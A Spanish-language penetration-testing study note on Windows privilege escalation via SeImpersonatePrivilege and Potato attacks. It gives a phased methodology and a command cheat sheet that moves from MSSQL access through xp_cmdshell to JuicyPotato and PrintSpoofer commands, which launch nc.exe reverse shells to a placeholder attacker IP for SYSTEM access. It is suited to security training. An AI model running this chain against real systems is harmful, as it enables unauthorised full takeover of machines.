---
tags:
  - windows
  - privex
  - potatoattack
---
## Conceptos Clave (TL;DR)

- Todo proceso en Windows tiene un token con info de la cuenta que lo ejecuta. Los tokens no son recursos seguros (residen en memoria), pero para usarlos (impersonarlos) se necesita el privilegio `SeImpersonatePrivilege`.
- `SeImpersonatePrivilege` normalmente se otorga a cuentas de servicio (IIS, MSSQL, etc.) para que puedan actuar en nombre del cliente que se conecta (ej. acceder a recursos de red autenticando como el usuario conectante).
- Los ataques "Potato" (JuicyPotato, PrintSpoofer, RoguePotato) engañan a un proceso SYSTEM (mediante abuso de DCOM/NTLM reflection o named pipes) para que se conecte a un proceso controlado por el atacante y le entregue su token, escalando de cuenta de servicio a `NT AUTHORITY\SYSTEM`.
- Es el vector clásico tras obtener RCE en contextos de cuenta de servicio: web shell en ASP.NET, RCE vía Jenkins, o ejecución de comandos vía MSSQL (`xp_cmdshell`). Lo primero que se debe chequear tras un foothold de este tipo es `whoami /priv`.
- Selección de herramienta según versión de OS: JuicyPotato funciona en versiones antiguas; PrintSpoofer y RoguePotato funcionan en Windows Server 2019 / Windows 10 build 1809+ donde JuicyPotato fue parcheado.

## Herramientas Clave

| Herramienta | Propósito |
|---|---|
| `mssqlclient.py` (Impacket) | Conectarse a una instancia MSSQL remota con credenciales válidas (auth SQL o Windows). |
| `xp_cmdshell` | Stored procedure de MSSQL para ejecutar comandos del sistema operativo desde una sesión SQL. |
| Snaffler | Herramienta de descubrimiento de credenciales/archivos sensibles en shares de red (mencionada como origen de las credenciales). |
| JuicyPotato | Explota `SeImpersonate`/`SeAssignPrimaryToken` vía abuso de DCOM/NTLM reflection. No funciona en Server 2019 / Win10 1809+. |
| PrintSpoofer | Explota `SeImpersonate` vía named pipe abuse del servicio Print Spooler. Funciona en versiones donde JuicyPotato está parcheado. |
| RoguePotato | Alternativa a JuicyPotato/PrintSpoofer para versiones modernas, basada en relay NTLM/OXID. |
| Netcat (`nc.exe`) | Listener en atacante y binario subido al target para obtener reverse shell. |

## Metodología Paso a Paso

### Fase 1: Acceso inicial y confirmación de contexto
La lógica es confirmar bajo qué cuenta de servicio se está ejecutando el código antes de intentar escalar.
1. Conectarse al servicio (MSSQL en este caso) con credenciales obtenidas (ej. vía Snaffler en un share).
2. Habilitar `xp_cmdshell` si no está activo, para pasar de queries SQL a ejecución de comandos OS.
3. Confirmar identidad con `whoami`.

### Fase 2: Enumeración de privilegios
La lógica es identificar si el contexto actual tiene privilegios de impersonación explotables.
1. Ejecutar `whoami /priv` y buscar específicamente `SeImpersonatePrivilege` o `SeAssignPrimaryTokenPrivilege` en estado `Enabled`.
2. Si están presentes, el camino a SYSTEM es directo vía técnicas Potato.

### Fase 3: Preparación de la explotación
La lógica es subir las herramientas necesarias y preparar el canal de salida (reverse shell).
1. Subir el binario Potato correspondiente (JuicyPotato/PrintSpoofer/RoguePotato) y `nc.exe` al target.
2. Levantar un listener Netcat en la máquina atacante en el puerto elegido (ej. 8443).

### Fase 4: Ejecución y escalada
La lógica es forzar a un proceso SYSTEM a conectarse de vuelta entregando su token, capturado como reverse shell.
1. Decidir la herramienta según versión de OS del target:
   - OS antiguo (pre-1809 / pre Server 2019) -> JuicyPotato.
   - OS moderno (Server 2019, Win10 1809+) -> PrintSpoofer o RoguePotato.
2. Ejecutar el binario apuntando a `nc.exe` como payload para obtener shell reversa.
3. Capturar la conexión en el listener Netcat y confirmar `whoami` = `nt authority\system`.

## Cheat Sheet de Comandos

```bash
# Conectar a instancia MSSQL remota usando Windows Authentication con Impacket
mssqlclient.py <USER>@<TARGET_IP> -windows-auth
```

```sql
-- Dentro de la sesión SQL: habilitar la stored procedure xp_cmdshell para ejecutar comandos OS
-- (Impacket se encarga de ejecutar RECONFIGURE automaticamente)
enable_xp_cmdshell
```

```sql
-- Confirmar el contexto de usuario bajo el cual corre el servicio MSSQL
xp_cmdshell whoami
```

```sql
-- Enumerar privilegios del token actual. Buscar SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege en Enabled
xp_cmdshell whoami /priv
```

```bash
# Listener Netcat en la maquina atacante, a la espera de la shell reversa SYSTEM
sudo nc -lnvp <LISTENER_PORT>
```

```sql
-- Ejecutar JuicyPotato desde la sesion SQL para escalar a SYSTEM
-- -l : puerto local en el que escucha el servidor COM falso
-- -p : programa a lanzar (cmd.exe)
-- -a : argumentos pasados al programa (-p), aqui se invoca nc.exe para la reverse shell
-- -t : metodo de creacion de proceso a probar (* = intenta CreateProcessWithTokenW y CreateProcessAsUser)
xp_cmdshell c:\tools\JuicyPotato.exe -l <COM_PORT> -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <ATTACKER_IP> <LISTENER_PORT> -e cmd.exe" -t *
```

```sql
-- Ejecutar PrintSpoofer desde la sesion SQL (alternativa cuando JuicyPotato no funciona)
-- -c : comando a ejecutar tras obtener el token SYSTEM via named pipe abuse del Print Spooler
xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <ATTACKER_IP> <LISTENER_PORT> -e cmd"
```

```cmd
:: Verificacion final dentro de la shell SYSTEM obtenida
whoami
hostname
```

## "Gotchas" y Troubleshooting

- JuicyPotato deja de funcionar a partir de Windows Server 2019 y Windows 10 build 1809 en adelante (parche de Microsoft contra el abuso de DCOM/NTLM reflection). Si el target es de esas versiones, usar PrintSpoofer o RoguePotato directamente.
- `SeImpersonatePrivilege` suele estar habilitado por defecto en cuentas de servicio (IIS, MSSQL, Jenkins) — siempre correr `whoami /priv` inmediatamente tras lograr RCE en este tipo de contextos, ya que suele ser la vía más rápida a SYSTEM.
- Los tokens viven en memoria y no son un "recurso seguro" per se, pero requieren el privilegio correspondiente para ser utilizados/impersonados; sin el privilegio, no hay vector de ataque aunque el token exista.
- JuicyPotato necesita un CLSID válido (en el ejemplo se usó `*` para que pruebe ambos métodos: `CreateProcessWithTokenW` y `CreateProcessAsUser`). Si un CLSID específico falla, probar otros conocidos según la versión de OS.
- PrintSpoofer depende del servicio Print Spooler (named pipe abuse); si el spooler está deshabilitado en el target, esta técnica no funcionará y se debe recurrir a RoguePotato.
- El flujo típico de obtención de credenciales previas (en el ejemplo, vía un archivo `logins.sql` encontrado con Snaffler en un share) es un recordatorio de revisar shares de red en busca de credenciales antes de intentar fuerza bruta o explotación directa.
- No es necesario teclear `RECONFIGURE` manualmente tras `enable_xp_cmdshell` cuando se usa Impacket, ya que la herramienta lo gestiona internamente.